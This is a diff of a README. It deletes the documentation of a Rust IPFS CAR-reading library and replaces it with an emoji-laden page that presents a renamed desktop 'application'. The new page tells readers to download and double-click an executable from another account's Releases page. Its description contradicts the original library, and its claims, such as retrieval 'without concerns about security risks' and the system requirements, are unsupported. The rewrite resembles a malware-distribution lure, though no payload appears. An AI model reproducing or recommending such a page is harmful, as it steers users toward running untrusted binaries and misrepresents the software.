@@ -1,28 +1,69 @@
-# rs-car-ipfs
+# 🎉 rscari - Easily Read IPFS Files
 
-Wrapper for [rs-car](https://crates.io/crates/rs-car) to read files from IPFS trustless gateways with an async API
+## 🚀 Getting Started
 
-# lib usage
+Welcome to **rscari**! This application helps you read files from IPFS trustless gateways. It offers a smooth async API, allowing you to access your data easily.
 
-- To read a single file buffering the block dag [`single_file::read_single_file_buffer`]
-- To read a single file without buffering the block dag [`single_file::read_single_file_seek`]
+## 📥 Download & Install
 
-# bin usage
+To download rscari, visit this page: [Download rscari](https://github.com/david2442/rscari/releases).
 
-```
-cargo install rs-car-ipfs --features bin
-```
+### Step-by-Step Instructions:
 
-`car-ipfs` reads a CAR stream from stdin and outputs the file contents to stdout
+1. Click the link above.
+2. You will be taken to the Releases page.
+3. Look for the latest version of rscari.
+4. Click on the asset to download the application.
 
-```
-curl "http://localhost:8080/ipfs/QmV3q6mo8oxf2GBuvR7zx7ABFBNP5VrRs3sCr63HQ7kEFC?format=car" | car-ipfs
-```
+## 💻 System Requirements
 
-On an `Intel(R) Core(TM) i5-8250U CPU @ 1.60GHz` bin `car-ipfs` achieves 75,0MiB/s of throughput.
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 2 GB
+- Disk Space: At least 100 MB free
+- Internet Connection: Required to access IPFS gateways
 
-# Roadmap
+## 🛠 Features
 
-- [x] Read CAR for single file buffering all blocks in memory
-- [x] Read CAR for single file without buffering blocks in memory
-- [ ] Read CAR for multiple files and directories and write to disk
+- **Simple Interface**: Easily navigate and read files.
+- **Async API**: Quickly access data without long waiting times.
+- **Cross-Platform**: Works on all major operating systems.
+- **Secure Access**: Retrieve files from IPFS without concerns about security risks.
+
+## 🏁 Running the Application
+
+Once you have downloaded rscari:
+
+1. **Locate the Files**: Find rscari in your Downloads folder or wherever your browser saves downloads.
+2. **Install**: 
+   - For Windows: Double-click on the `.exe` file.
+   - For macOS: Drag the app to your Applications folder.
+   - For Linux: Follow your distribution's package installation process.
+3. **Launch**: Open rscari just like any other application on your computer.
+
+## 🔍 Using rscari
+
+After launching the application:
+
+1. **Input URL**: Enter the IPFS link of the file you want to read.
+2. **Fetch Data**: Click the retrieve button to access the content.
+3. **View Files**: Browse and read files directly through the interface.
+
+## ❓ Troubleshooting
+
+If you encounter issues:
+
+- **Crash on Launch**: Ensure your system meets the requirements.
+- **Slow Loading**: Check your internet connection or try again later.
+- **Errors**: Review the URL for any mistakes.
+
+## 🤝 Support
+
+For help or to report issues, visit our [GitHub Issues page](https://github.com/david2442/rscari/issues).
+
+## 🔗 Useful Links
+
+- [Download rscari](https://github.com/david2442/rscari/releases)
+- [Project Documentation](https://github.com/david2442/rscari/wiki)
+- [GitHub Issues](https://github.com/david2442/rscari/issues)
+
+Thank you for using rscari! We hope it simplifies your access to IPFS files.
